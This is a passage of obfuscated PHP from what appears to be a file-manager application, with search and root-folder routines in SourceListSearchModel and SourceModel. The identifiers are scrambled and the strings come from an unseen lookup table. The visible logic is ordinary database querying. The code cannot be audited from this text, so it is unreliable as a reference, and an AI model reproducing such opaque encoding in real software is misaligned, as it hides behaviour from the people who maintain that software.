clearSame($ÀÖÜ‚Ï») { $„ÅÚ‰±¹ =& $_SERVER[ĞÆÏ¡Îª]; $¦ç†²ÁÔ = $this->listData($ÀÖÜ‚Ï»); $®§ó¯ÇĞ = array_to_keyvalue_group($¦ç†²ÁÔ, $„ÅÚ‰±¹[477]); $’›Ó‘­Ì = array(); $ş£Å¥ËÈ = array(); foreach ($®§ó¯ÇĞ as $óöô¬ÚÚ) { if (!$óöô¬ÚÚ || count($óöô¬ÚÚ) <= 1) { continue; } foreach ($óöô¬ÚÚ as $ÖôüÜ¶ê) { $’›Ó‘­Ì[] = $ÖôüÜ¶ê[$„ÅÚ‰±¹[477]]; $ş£Å¥ËÈ[] = $ÖôüÜ¶ê[$„ÅÚ‰±¹[407]]; } } if (!$ş£Å¥ËÈ) { return; } $this->where(array($„ÅÚ‰±¹[407] => array($„ÅÚ‰±¹[7], $ş£Å¥ËÈ)))->delete(); Model($„ÅÚ‰±¹[480])->remove($’›Ó‘­Ì); } public function userSpace() { $Ğ¤Ö®— =& $_SERVER[ĞÆÏ¡Îª]; $²Æ¾£íË = $this->tablePrefix; $ñÁ•£ğ = array($Ğ¤Ö®—[1638] => USER_ID); $øïîê«» = "{$²Æ¾£íË}\x69\157\137\x66\151\x6c\x65\40\x66\x69\154\145\163\x20\x6f\x6e\40\146\x69\154\145\163\x2e\x66\x69\154\145\111\x44\x20\x3d\x20\x68\151\163\x74\157\x72\x79\x2e\x66\x69\154\x65\111\x44"; return $this->alias($Ğ¤Ö®—[2067])->where($ñÁ•£ğ)->join($øïîê«», $Ğ¤Ö®—[2068])->sum($Ğ¤Ö®—[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¥ÒßÁ) { $«˜Á•ƒÂ =& $_SERVER[ĞÆÏ¡Îª]; $ïÒàÖãĞ = KodIO::fileTypeList(); $Ş³†ï°Í = $ïÒàÖãĞ[$¥ÒßÁ]; if (!$Ş³†ï°Í) { return array(); } $É»€…¶¥ = $Ş³†ï°Í[$«˜Á•ƒÂ[174]]; $©İóÌû¿ = $«˜Á•ƒÂ[7]; if (!$Ş³†ï°Í[$«˜Á•ƒÂ[174]]) { $µ–»òŒØ = array_to_keyvalue($ïÒàÖãĞ, $«˜Á•ƒÂ[12], $«˜Á•ƒÂ[174]); $É»€…¶¥ = implode($«˜Á•ƒÂ[50], $µ–»òŒØ); $©İóÌû¿ = $«˜Á•ƒÂ[2070]; } $ºûÛ¦Ûè = explode($«˜Á•ƒÂ[50], trim($É»€…¶¥, $«˜Á•ƒÂ[50])); return array($©İóÌû¿, $ºûÛ¦Ûè); } public function listPathType($‡¿ç…‚¾) { $µı‘¤Çè =& $_SERVER[ĞÆÏ¡Îª]; $óåÅà€× = $this->fileTypeWhere($‡¿ç…‚¾); if (!$óåÅà€×) { return array(); } $úßìì¾§ = USER_ID; $Åà¢Ìï— = Model($µı‘¤Çè[544])->getInfo($úßìì¾§); $”ˆÒ·Š¶ = array($µı‘¤Çè[595] => SourceModel::TYPE_USER, $µı‘¤Çè[530] => array($µı‘¤Çè[559], $µı‘¤Çè[540] . $Åà¢Ìï—[$µı‘¤Çè[86]][$µı‘¤Çè[411]] . $µı‘¤Çè[560]), $µı‘¤Çè[596] => $úßìì¾§, $µı‘¤Çè[592] => 0, $µı‘¤Çè[593] => $óåÅà€×); return $this->listSource($”ˆÒ·Š¶); } public function listSearch($°ÍÀìõ, $ÛÇ’ìß¤ = 300) { $˜„¹¿… =& $_SERVER[ĞÆÏ¡Îª]; if (isset($°ÍÀìõ[$˜„¹¿…[1913]]) && $°ÍÀìõ[$˜„¹¿…[1913]]) { $°ÍÀìõ[$˜„¹¿…[1913]] = str_replace($˜„¹¿…[392], $˜„¹¿…[2071], trim($°ÍÀìõ[$˜„¹¿…[1913]])); } $·Ù = $this->_parseSearchWhere($°ÍÀìõ); if (!isset($·Ù[$˜„¹¿…[440]])) { $·Ù[$˜„¹¿…[440]] = 0; } $­‚óÅİ = $˜„¹¿…[2072]; $şÔ›Ò›‡ = $·Ù; $ñùĞ‹£± = $­‚óÅİ; $this->_listSearchBindPinyin($°ÍÀìõ, $·Ù, $­‚óÅİ); $this->alias($˜„¹¿…[455])->_makeOrder(); $·Ù = $this->parseWhereLike($·Ù); $‘çñÓö„ = $this->distinct(!0)->field($­‚óÅİ)->where($·Ù)->selectPage($ÛÇ’ìß¤); if ($GLOBALS[$˜„¹¿…[6]][$˜„¹¿…[389]][$˜„¹¿…[390]] && Input::check($°ÍÀìõ[$˜„¹¿…[1913]], $˜„¹¿…[602]) && $‘çñÓö„[$˜„¹¿…[375]][$˜„¹¿…[362]] == 1 && $‘çñÓö„[$˜„¹¿…[375]][$˜„¹¿…[376]] == 0) { $‘çñÓö„ = $this->distinct(!0)->field($­‚óÅİ)->where($şÔ›Ò›‡)->limit(1000)->select(); $‘çñÓö„ = array_page_split($‘çñÓö„, !1, $ÛÇ’ìß¤); } $this->_listSearchFileContent($‘çñÓö„, $°ÍÀìõ, $ñùĞ‹£±, $şÔ›Ò›‡); $this->_listSearchDesc($‘çñÓö„, $°ÍÀìõ, $ñùĞ‹£±); $this->_listSearchTag($‘çñÓö„, $°ÍÀìõ, $ñùĞ‹£±); $this->_listSearchGroupTag($‘çñÓö„, $°ÍÀìõ, $ñùĞ‹£±); $this->_listDataApply($‘çñÓö„[$˜„¹¿…[378]]); $this->_listMake($‘çñÓö„); return $‘çñÓö„; } private function _listSearchFileContent(&$™ıÀÌ¯ã, $‡òÉ…â, $şÏŞÂÁ, $€öÂ¾õõ) { $«ÚşÌˆÍ =& $_SERVER[ĞÆÏ¡Îª]; if (!$‡òÉ…â[$«ÚşÌˆÍ[1913]] || $™ıÀÌ¯ã[$«ÚşÌˆÍ[375]][$«ÚşÌˆÍ[362]] > 1) { return; } if (!isset($€öÂ¾õõ[$«ÚşÌˆÍ[32]]) || !is_array($‡òÉ…â[$«ÚşÌˆÍ[477]])) { return; } $€öÂ¾õõ[$«ÚşÌˆÍ[477]] = array($«ÚşÌˆÍ[7], $‡òÉ…â[$«ÚşÌˆÍ[477]]); unset($€öÂ¾õõ[$«ÚşÌˆÍ[32]]); unset($‡òÉ…â[$«ÚşÌˆÍ[477]]); $ÁÍ‘†ñ = $this->field($şÏŞÂÁ)->where($€öÂ¾õõ)->limit($«ÚşÌˆÍ[2073])->select(); if (!$ÁÍ‘†ñ || count($ÁÍ‘†ñ) == 0) { return; } $™ıÀÌ¯ã[$«ÚşÌˆÍ[378]] = array_merge($ÁÍ‘†ñ, $™ıÀÌ¯ã[$«ÚşÌˆÍ[378]]); $™ıÀÌ¯ã[$«ÚşÌˆÍ[375]][$«ÚşÌˆÍ[376]] += count($ÁÍ‘†ñ); } private function _listSearchTag(&$Š•Õ¢ûĞ, $Øùåµì, $¯¯É…ÚÆ) { $Õ å’˜Ï =& $_SERVER[ĞÆÏ¡Îª]; if (!$Øùåµì[$Õ å’˜Ï[1913]] || $Š•Õ¢ûĞ[$Õ å’˜Ï[375]][$Õ å’˜Ï[362]] > 1) { return; } $ğ˜ Íà = Model($Õ å’˜Ï[2074])->listData(); $í»¤÷üÚ = array(); $éÂ©™ÑÙ = $Øùåµì[$Õ å’˜Ï[1913]]; foreach ($ğ˜ Íà as $¬¢æ·ıä) { $Ç°Àœî = $¬¢æ·ıä[$Õ å’˜Ï[32]]; $òË×·¸ğ = str_replace($Õ å’˜Ï[53], $Õ å’˜Ï[12], Pinyin::get($Ç°Àœî)); if (stripos($Ç°Àœî, $éÂ©™ÑÙ) !== !1 || stripos($òË×·¸ğ, $éÂ©™ÑÙ) !== !1) { $í»¤÷üÚ[] = $¬¢æ·ıä[$Õ å’˜Ï[407]]; } } if (!$í»¤÷üÚ) { return; } $®ÌĞŠ = array($Õ å’˜Ï[435] => array($Õ å’˜Ï[7], $í»¤÷üÚ), $Õ å’˜Ï[1647] => USER_ID); $µÎ®·™„ = Model($Õ å’˜Ï[437])->field($Õ å’˜Ï[84])->where($®ÌĞŠ)->select(); $µÎ®·™„ = array_to_keyvalue($µÎ®·™„, $Õ å’˜Ï[12], $Õ å’˜Ï[84]); $¯öÇ¤üÚ = array_unique($µÎ®·™„); $this->_listSearchMerge($Š•Õ¢ûĞ, $Øùåµì, $¯¯É…ÚÆ, $¯öÇ¤üÚ); } private function _listSearchDesc(&$®‘µûó¯, $ÙéŒ¥Îş, $Ó‹âÖÄş) { $ÃÍ¬š˜É =& $_SERVER[ĞÆÏ¡Îª]; if (!$ÙéŒ¥Îş[$ÃÍ¬š˜É[1913]] || $®‘µûó¯[$ÃÍ¬š˜É[375]][$ÃÍ¬š˜É[362]] > 1) { return; } $Ú–…Ã» = array($ÃÍ¬š˜É[94] => $ÃÍ¬š˜É[462], $ÃÍ¬š˜É[383] => array($ÃÍ¬š˜É[391], $ÃÍ¬š˜É[1915] . $ÙéŒ¥Îş[$ÃÍ¬š˜É[1913]] . $ÃÍ¬š˜É[1915])); $ı‘Ã´ğÉ = !1; if ($ı‘Ã´ğÉ) { $ë»¼•üŞ = $this->listSearchChildren($ÙéŒ¥Îş[$ÃÍ¬š˜É[441]]); $ë»¼•üŞ = array_unique($ë»¼•üŞ); if (!$ë»¼•üŞ) { return; } $Ú–…Ã»[$ÃÍ¬š˜É[411]] = array($ÃÍ¬š˜É[7], $ë»¼•üŞ); } $Ö•×û–Ü = Model($ÃÍ¬š˜É[578])->field($ÃÍ¬š˜É[411])->where($Ú–…Ã»)->limit(5000)->select(); $óîÛâ± = array_to_keyvalue($Ö•×û–Ü, $ÃÍ¬š˜É[12], $ÃÍ¬š˜É[411]); $this->_listSearchMerge($®‘µûó¯, $ÙéŒ¥Îş, $Ó‹âÖÄş, $óîÛâ±); } private function _listSearchGroupTag(&$‹‘ğ´áÑ, $Â²áÓö®, $ÈÖËòŞî) { $îúû²ê¨ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Â²áÓö®[$îúû²ê¨[1913]] || $‹‘ğ´áÑ[$îúû²ê¨[375]][$îúû²ê¨[362]] > 1 || !$Â²áÓö®[$îúû²ê¨[441]]) { return; } $ºÖÜ¸É = $this->sourceInfo($Â²áÓö®[$îúû²ê¨[441]]); if (!$ºÖÜ¸É || $ºÖÜ¸É[$îúû²ê¨[420]] != SourceModel::TYPE_GROUP) { return; } $¤¶¦å±³ = $ºÖÜ¸É[$îúû²ê¨[514]]; $¶ÌÊ· = Model($îúû²ê¨[2075])->get($¤¶¦å±³); $ˆ“éıµÑ = array(); $¤¶ëÛæ© = $Â²áÓö®[$îúû²ê¨[1913]]; foreach ($¶ÌÊ·[$îúû²ê¨[378]] as $âñ½¸´ê) { $ûÜí©çÆ = $âñ½¸´ê[$îúû²ê¨[32]]; $û¨ö™è = str_replace($îúû²ê¨[53], $îúû²ê¨[12], Pinyin::get($ûÜí©çÆ)); if (stripos($ûÜí©çÆ, $¤¶ëÛæ©) !== !1 || stripos($û¨ö™è, $¤¶ëÛæ©) !== !1) { $ˆ“éıµÑ[] = $âñ½¸´ê[$îúû²ê¨[407]]; } } if (!$ˆ“éıµÑ) { return; } $Ô£äá˜ = array($îúû²ê¨[435] => array($îúû²ê¨[7], $ˆ“éıµÑ), $îúû²ê¨[1647] => 0, $îúû²ê¨[33] => $îúû²ê¨[1935] . $¤¶¦å±³); $ÁŸ³Œ´ = Model($îúû²ê¨[437])->field($îúû²ê¨[84])->where($Ô£äá˜)->select(); $ÁŸ³Œ´ = array_to_keyvalue($ÁŸ³Œ´, $îúû²ê¨[12], $îúû²ê¨[84]); $ú¦‚ÁÙ  = array_unique($ÁŸ³Œ´); $this->_listSearchMerge($‹‘ğ´áÑ, $Â²áÓö®, $ÈÖËòŞî, $ú¦‚ÁÙ ); } private function _listSearchMerge(&$£èáüµä, $ÖÌŠãøÑ, $¾´í÷½ä, $½ª’ò´Š) { $°à‘šêú =& $_SERVER[ĞÆÏ¡Îª]; if (!$½ª’ò´Š) { return; } $±—£Êõç = array_to_keyvalue($£èáüµä[$°à‘šêú[378]], $°à‘šêú[12], $°à‘šêú[411]); $ñ¶îÕ“ˆ = array_diff($½ª’ò´Š, $±—£Êõç); if (!$ñ¶îÕ“ˆ) { return; } $¥É¼ª÷ = array($°à‘šêú[411] => array($°à‘šêú[7], $ñ¶îÕ“ˆ)); $÷ëµ½Çˆ = $this->field($¾´í÷½ä)->where($¥É¼ª÷)->select(); if (!$÷ëµ½Çˆ) { return; } $’ËÈö«Ÿ = array(); foreach ($÷ëµ½Çˆ as $š£Î’Ñû) { if ($this->_listSearchFilter($š£Î’Ñû, $ÖÌŠãøÑ)) { $’ËÈö«Ÿ[] = $š£Î’Ñû; } } $£èáüµä[$°à‘šêú[378]] = array_merge($’ËÈö«Ÿ, $£èáüµä[$°à‘šêú[378]]); $£èáüµä[$°à‘šêú[375]][$°à‘šêú[376]] += count($’ËÈö«Ÿ); } private function _listSearchFilter($¼êØäÚ, $ğ·Áû¾¶) { $¢î•×ÅÎ =& $_SERVER[ĞÆÏ¡Îª]; $¸©›¼ã = $¼êØäÚ[$¢î•×ÅÎ[419]] == $¢î•×ÅÎ[88]; if (!strstr($¼êØäÚ[$¢î•×ÅÎ[530]], $¢î•×ÅÎ[50] . $ğ·Áû¾¶[$¢î•×ÅÎ[441]] . $¢î•×ÅÎ[50])) { return !1; } if (isset($ğ·Áû¾¶[$¢î•×ÅÎ[421]]) && $ğ·Áû¾¶[$¢î•×ÅÎ[421]] != $¢î•×ÅÎ[1874]) { if ($ğ·Áû¾¶[$¢î•×ÅÎ[421]] == $¢î•×ÅÎ[75] && !$¸©›¼ã) { return !1; } if ($ğ·Áû¾¶[$¢î•×ÅÎ[421]] != $¢î•×ÅÎ[75] && $¸©›¼ã) { return !1; } if (!strstr($¼êØäÚ[$¢î•×ÅÎ[174]], $¢î•×ÅÎ[50] . $ğ·Áû¾¶[$¢î•×ÅÎ[421]] . $¢î•×ÅÎ[50])) { return !1; } } if (isset($ğ·Áû¾¶[$¢î•×ÅÎ[2076]]) && $ğ·Áû¾¶[$¢î•×ÅÎ[2076]] < $¼êØäÚ[$¢î•×ÅÎ[76]]) { return !1; } if (isset($ğ·Áû¾¶[$¢î•×ÅÎ[2077]]) && $ğ·Áû¾¶[$¢î•×ÅÎ[2077]] > $¼êØäÚ[$¢î•×ÅÎ[76]]) { return !1; } if (isset($ğ·Áû¾¶[$¢î•×ÅÎ[609]]) && $ğ·Áû¾¶[$¢î•×ÅÎ[609]] != $¼êØäÚ[$¢î•×ÅÎ[465]]) { return !1; } return !0; } public function listSearchChildren($æ’şñçÉ, $ºşí×¿Å = 5000) { $ØÅÁ¬€Ó =& $_SERVER[ĞÆÏ¡Îª]; $ï–€¯¦ö = array(); $ÀÁ¥ÂÇÎ = $this->sourceInfo($æ’şñçÉ); $…í–ØÏÑ = array($ØÅÁ¬€Ó[530] => array($ØÅÁ¬€Ó[391], $ÀÁ¥ÂÇÎ[$ØÅÁ¬€Ó[530]] . $ÀÁ¥ÂÇÎ[$ØÅÁ¬€Ó[411]] . $ØÅÁ¬€Ó[560])); $‚ª¯ÜŞú = $this->field($ØÅÁ¬€Ó[76])->where($…í–ØÏÑ)->limit($ºşí×¿Å + 1)->select(); $öêùñª® = is_array($‚ª¯ÜŞú) ? count($‚ª¯ÜŞú) : 0; if ($öêùñª® > $ºşí×¿Å) { return $this->_listSearchChildrenNear($æ’şñçÉ, $ºşí×¿Å); } $í¿µ½ = $this->field($ØÅÁ¬€Ó[411])->where($…í–ØÏÑ)->select(); $ï–€¯¦ö = array_to_keyvalue($í¿µ½, $ØÅÁ¬€Ó[12], $ØÅÁ¬€Ó[411]); return $ï–€¯¦ö; } private function _listSearchChildrenNear($«á“ØÜü, $©Àí¼±) { $ÛíÀÒ¹ =& $_SERVER[ĞÆÏ¡Îª]; $Â¼ÌšöÕ = array(); $ãïºÎ­Ñ = array($ÛíÀÒ¹[441] => $«á“ØÜü); $œ¿•›Ä‡ = $this->field($ÛíÀÒ¹[2078])->where($ãïºÎ­Ñ)->select(); $ƒˆÈûÎ = array_to_keyvalue(array_filter_by_field($œ¿•›Ä‡, $ÛíÀÒ¹[419], $ÛíÀÒ¹[88]), $ÛíÀÒ¹[12], $ÛíÀÒ¹[411]); $Â¼ÌšöÕ = array_merge($Â¼ÌšöÕ, array_to_keyvalue($œ¿•›Ä‡, $ÛíÀÒ¹[12], $ÛíÀÒ¹[411])); if (!$ƒˆÈûÎ) { return $Â¼ÌšöÕ; } $ãïºÎ­Ñ = array($ÛíÀÒ¹[441] => array($ÛíÀÒ¹[7], $ƒˆÈûÎ)); $œ¿•›Ä‡ = $this->field($ÛíÀÒ¹[2078])->where($ãïºÎ­Ñ)->limit($©Àí¼±)->select(); $Â¼ÌšöÕ = array_merge($Â¼ÌšöÕ, array_to_keyvalue($œ¿•›Ä‡, $ÛíÀÒ¹[12], $ÛíÀÒ¹[411])); $Â¼ÌšöÕ = array_slice($Â¼ÌšöÕ, 0, $©Àí¼±); return $Â¼ÌšöÕ; } private function _listSearchBindPinyin($Ã·âüÓ®, &$Šäôñğ, &$øÅ¯áô) { $ÕÌ±›Šö =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($Ã·âüÓ®[$ÕÌ±›Šö[1913]]) || !$Ã·âüÓ®[$ÕÌ±›Šö[1913]]) { return; } if (!Input::check($Ã·âüÓ®[$ÕÌ±›Šö[1913]], $ÕÌ±›Šö[327]) || strlen($Ã·âüÓ®[$ÕÌ±›Šö[1913]]) < 2) { return; } $¼½‹â¬ = "\x4c\105\x46\x54\x20\x4a\117\111\116\40{$this->tablePrefix}\151\157\x5f\163\x6f\x75\162\143\x65\x5f\x6d\145\164\141\40\155\x65\164\x61\x20\x6f\x6e\x20\x73\x6f\x75\x72\x63\145\56\163\x6f\x75\162\x63\145\x49\104\x20\x3d\40\x6d\145\x74\x61\x2e\163\157\x75\162\143\145\111\104"; $ÄÊì§ˆ¦ = array(); $øÅ¯áô = str_replace(array($ÕÌ±›Šö[231], $ÕÌ±›Šö[53], $ÕÌ±›Šö[2079]), $ÕÌ±›Šö[12], $øÅ¯áô); $øÅ¯áô = $ÕÌ±›Šö[447] . str_replace($ÕÌ±›Šö[50], $ÕÌ±›Šö[448], $øÅ¯áô); $á½èíÜä = $Šäôñğ[$ÕÌ±›Šö[32]]; unset($Šäôñğ[$ÕÌ±›Šö[32]]); foreach ($Šäôñğ as $óáØ£µ˜ => $ò¡–œ›ƒ) { $ÄÊì§ˆ¦[$ÕÌ±›Šö[447] . $óáØ£µ˜] = $ò¡–œ›ƒ; } foreach ($á½èíÜä as $Ğàéù£) { $ÄÊì§ˆ¦[] = array($ÕÌ±›Šö[452] => $Ğàéù£, $ÕÌ±›Šö[991] => $ÕÌ±›Šö[1917], array($ÕÌ±›Šö[2080] => $Ğàéù£, $ÕÌ±›Šö[2081] => array($ÕÌ±›Šö[7], array($ÕÌ±›Šö[474], $ÕÌ±›Šö[473])))); } $this->join($¼½‹â¬); $Šäôñğ = $ÄÊì§ˆ¦; } private function _parseSearchWhere($â„¶½ñ“) { $§îËÚÕ =& $_SERVER[ĞÆÏ¡Îª]; $çÑ©ñ¡® = array(); if (isset($â„¶½ñ“[$§îËÚÕ[756]]) && $â„¶½ñ“[$§îËÚÕ[756]]) { $çÑ©ñ¡®[$§îËÚÕ[85]] = array($§îËÚÕ[2082], $â„¶½ñ“[$§îËÚÕ[756]]); } if (isset($â„¶½ñ“[$§îËÚÕ[506]]) && $â„¶½ñ“[$§îËÚÕ[506]]) { $°¬³â¨ = array($§îËÚÕ[2083], $â„¶½ñ“[$§îËÚÕ[506]]); if ($çÑ©ñ¡®[$§îËÚÕ[85]]) { $çÑ©ñ¡®[$§îËÚÕ[85]] = array($çÑ©ñ¡®[$§îËÚÕ[85]], $°¬³â¨, $§îËÚÕ[2084]); } else { $çÑ©ñ¡®[$§îËÚÕ[85]] = $°¬³â¨; } } if (isset($â„¶½ñ“[$§îËÚÕ[2076]]) && $â„¶½ñ“[$§îËÚÕ[2076]] > 0) { $çÑ©ñ¡®[$§îËÚÕ[76]] = array($§îËÚÕ[2082], $â„¶½ñ“[$§îËÚÕ[2076]]); } if (isset($â„¶½ñ“[$§îËÚÕ[2077]]) && $â„¶½ñ“[$§îËÚÕ[2077]]) { $°¬³â¨ = array($§îËÚÕ[2083], $â„¶½ñ“[$§îËÚÕ[2077]]); if ($çÑ©ñ¡®[$§îËÚÕ[76]]) { $çÑ©ñ¡®[$§îËÚÕ[76]] = array($çÑ©ñ¡®[$§îËÚÕ[76]], $°¬³â¨, $§îËÚÕ[2084]); } else { $çÑ©ñ¡®[$§îËÚÕ[76]] = $°¬³â¨; } } if (isset($â„¶½ñ“[$§îËÚÕ[609]]) && $â„¶½ñ“[$§îËÚÕ[609]]) { $çÑ©ñ¡®[] = array($§îËÚÕ[465] => $â„¶½ñ“[$§îËÚÕ[609]], $§îËÚÕ[463] => $â„¶½ñ“[$§îËÚÕ[609]], $§îËÚÕ[991] => $§îËÚÕ[1917]); } if (isset($â„¶½ñ“[$§îËÚÕ[421]]) && $â„¶½ñ“[$§îËÚÕ[421]]) { $ÅÅµÎî = $â„¶½ñ“[$§îËÚÕ[421]]; if ($ÅÅµÎî == $§îËÚÕ[75]) { $çÑ©ñ¡®[$§îËÚÕ[419]] = 1; } else { if ($ÅÅµÎî == $§îËÚÕ[2085]) { $çÑ©ñ¡®[$§îËÚÕ[419]] = 0; } else { if ($ÅÅµÎî) { $ÅÅµÎî = is_array($ÅÅµÎî) ? $ÅÅµÎî : explode($§îËÚÕ[50], $ÅÅµÎî); $çÑ©ñ¡®[$§îËÚÕ[421]] = array($§îËÚÕ[427], $ÅÅµÎî); $çÑ©ñ¡®[$§îËÚÕ[419]] = 0; } } } } $this->_parseSearchParent($â„¶½ñ“, $çÑ©ñ¡®); if (isset($â„¶½ñ“[$§îËÚÕ[1913]]) && trim($â„¶½ñ“[$§îËÚÕ[1913]])) { $¬âŠ±…Ğ = trim($â„¶½ñ“[$§îËÚÕ[1913]]); $’Ü¦èí¯ = explode($§îËÚÕ[53], $¬âŠ±…Ğ); if (strlen($¬âŠ±…Ğ) > 2 && (substr($¬âŠ±…Ğ, 0, 1) == $§îËÚÕ[118] && substr($¬âŠ±…Ğ, -1) == $§îËÚÕ[118]) || substr($¬âŠ±…Ğ, 0, 1) == $§îËÚÕ[58] && substr($¬âŠ±…Ğ, -1) == $§îËÚÕ[58]) { $¬âŠ±…Ğ = substr($¬âŠ±…Ğ, 1, -1); $’Ü¦èí¯ = array($¬âŠ±…Ğ); } $çÑ©ñ¡®[$§îËÚÕ[32]] = array(array($§îËÚÕ[559], $§îËÚÕ[1915] . $¬âŠ±…Ğ . $§îËÚÕ[1915])); if (count($’Ü¦èí¯) > 1) { $çÑ©ñ¡®[$§îËÚÕ[32]] = array(); foreach ($’Ü¦èí¯ as $™—¦§) { if (!trim($™—¦§)) { continue; } $çÑ©ñ¡®[$§îËÚÕ[32]][] = array($§îËÚÕ[559], $§îËÚÕ[1915] . trim($™—¦§) . $§îËÚÕ[1915]); } } } return $çÑ©ñ¡®; } private function _parseSearchParent($ëÄŸ²Í§, &$¹Á×¿ºŒ) { $³¥êËö· =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($ëÄŸ²Í§[$³¥êËö·[441]]) || !$ëÄŸ²Í§[$³¥êËö·[441]]) { return; } $ÜñèÁ‹ = $this->pathInfo($ëÄŸ²Í§[$³¥êËö·[441]]); $†Ş™¡È = $ÜñèÁ‹[$³¥êËö·[441]] . $³¥êËö·[12] === $³¥êËö·[197]; $ûåË¢ÇÌ = $ÜñèÁ‹[$³¥êËö·[420]] == $³¥êËö·[524]; if ($ÜñèÁ‹[$³¥êËö·[541]] == $³¥êËö·[542]) { $í¯İÖ© = $this->sourceInfo($ëÄŸ²Í§[$³¥êËö·[441]]); $ÜñèÁ‹[$³¥êËö·[530]] = $í¯İÖ©[$³¥êËö·[530]]; } $¹Á×¿ºŒ[$³¥êËö·[599]] = array($³¥êËö·[559], $ÜñèÁ‹[$³¥êËö·[530]] . $ëÄŸ²Í§[$³¥êËö·[441]] . $³¥êËö·[560]); $£ç²Â®Ù = isset($ëÄŸ²Í§[$³¥êËö·[1778]]) && in_array($³¥êËö·[524], $ëÄŸ²Í§[$³¥êËö·[1778]]); if (!$£ç²Â®Ù || !$ûåË¢ÇÌ || !$†Ş™¡È || !$ÜñèÁ‹[$³¥êËö·[422]]) { return; } if (!AuthModel::authCheckRoot($ÜñèÁ‹[$³¥êËö·[422]][$³¥êËö·[423]])) { return; } $“âåúåú = $ÜñèÁ‹[$³¥êËö·[514]] . $³¥êËö·[12]; if ($“âåúåú == $³¥êËö·[88]) { unset($¹Á×¿ºŒ[$³¥êËö·[599]]); $¹Á×¿ºŒ[$³¥êËö·[420]] = self::TYPE_GROUP; return; } $Ú‡ÜÚ’ø = Model($³¥êËö·[531])->groupChildrenAll($“âåúåú); $Î»ö„ô = count($Ú‡ÜÚ’ø); if ($Î»ö„ô <= 1) { return; } $¾êäİª = array($³¥êËö·[441] => 0, $³¥êËö·[420] => self::TYPE_GROUP, $³¥êËö·[514] => array($³¥êËö·[7], $Ú‡ÜÚ’ø)); $°ÅğøÑÚ = $this->field($³¥êËö·[2086])->where($¾êäİª)->limit($Î»ö„ô)->select(); $¹Á×¿ºŒ[$³¥êËö·[599]] = array(); foreach ($°ÅğøÑÚ as $ÈÎÖ¹´ğ) { $¹Á×¿ºŒ[$³¥êËö·[599]][] = array($³¥êËö·[559], $³¥êËö·[540] . $ÈÎÖ¹´ğ[$³¥êËö·[411]] . $³¥êËö·[560]); } $¹Á×¿ºŒ[$³¥êËö·[599]][] = $³¥êËö·[1917]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ÿ´½Ä¥) { $Ïşõ½Å» =& $_SERVER[ĞÆÏ¡Îª]; $®Œ­çø = Model($Ïşõ½Å»[522])->where(array($Ïşõ½Å»[1638] => $Ÿ´½Ä¥))->find(); $Í ø©à = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ÿ´½Ä¥, $®Œ­çø[$Ïşõ½Å»[32]]); $this->userDesktopAdd($Í ø©à); return $Í ø©à; } public function userDesktopAdd($ãÜ×‡£ø) { $«â¡¤„¢ =& $_SERVER[ĞÆÏ¡Îª]; $Ìİ§­Ìş = LNG($«â¡¤„¢[2087]); $¸³êœ„ù = $this->mkdir($ãÜ×‡£ø, $Ìİ§­Ìş); $this->metaSet($¸³êœ„ù, $«â¡¤„¢[2088], $«â¡¤„¢[88]); $this->metaSet($ãÜ×‡£ø, $«â¡¤„¢[2089], $¸³êœ„ù); } public function userPathSafeAdd($ŒŒ™”ô) { $÷åÁ®§Õ =& $_SERVER[ĞÆÏ¡Îª]; $³Ö™’µ = Model($÷åÁ®§Õ[522])->getInfoFull($ŒŒ™”ô); if (!$³Ö™’µ) { return !1; } if (_get($³Ö™’µ, $÷åÁ®§Õ[545])) { return $³Ö™’µ[$÷åÁ®§Õ[475]][$÷åÁ®§Õ[2090]]; } $Œ¿âæ¾İ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ŒŒ™”ô, $÷åÁ®§Õ[2091], $÷åÁ®§Õ[442]); Model($÷åÁ®§Õ[522])->metaSet($ŒŒ™”ô, $÷åÁ®§Õ[2090], $Œ¿âæ¾İ); $this->metaSet($Œ¿âæ¾İ, $÷åÁ®§Õ[2092], $ŒŒ™”ô); return $Œ¿âæ¾İ; } public function groupRootAdd($¿–ş•™») { $ƒÉ¾Ñ©Ì =& $_SERVER[ĞÆÏ¡Îª]; $—îúı“Û = Model($ƒÉ¾Ñ©Ì[531])->where(array($ƒÉ¾Ñ©Ì[1907] => $¿–ş•™»))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¿–ş•™», $—îúı“Û[$ƒÉ¾Ñ©Ì[32]]); } public function systemRootPathAdd($ Øú´•–) { if ($ Øú´•– != $_SERVER[ĞÆÏ¡Îª][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ Øú´•–); } public function userRootRemove($ˆ¥½©‚µ) { $ù£œà°¸ = $this->sourceRoot(SourceModel::TYPE_USER, $ˆ¥½©‚µ, !0); foreach ($ù£œà°¸ as $‡ø‡¤·¿) { if (!$‡ø‡¤·¿) { continue; } $this->remove($‡ø‡¤·¿[$_SERVER[ĞÆÏ¡Îª][411]], !1); } } public function groupRootRemove($ÁíŒÕˆÌ) { $æôÒâÀ = $this->sourceRoot(SourceModel::TYPE_GROUP, $ÁíŒÕˆÌ); if (!$æôÒâÀ) { return; } $this->remove($æôÒâÀ[$_SERVER[ĞÆÏ¡Îª][411]], !1); } private function _mkdirRoot($Öñ±ºéü, $ÅŒñÀó, $ÙŒ¨åÔÙ, $óæıÀá = '') { $Õıßüˆğ =& $_SERVER[ĞÆÏ¡Îª]; $á§¿­Â¿ = array($Õıßüˆğ[410] => 0, $Õıßüˆğ[595] => $Öñ±ºéü, $Õıßüˆğ[596] => $ÅŒñÀó, $Õıßüˆğ[592] => 1, $Õıßüˆğ[597] => USER_ID, $Õıßüˆğ[598] => USER_ID, $Õıßüˆğ[593] => $óæıÀá, $Õıßüˆğ[599] => $Õıßüˆğ[540], $Õıßüˆğ[439] => 0, $Õıßüˆğ[594] => 0, $Õıßüˆğ[478] => 0, $Õıßüˆğ[600] => $Õıßüˆğ[12]); if ($¥óÁÕ¡ = $this->where($á§¿­Â¿)->find()) { return $¥óÁÕ¡[$Õıßüˆğ[411]]; } $™ì¡Šøû = 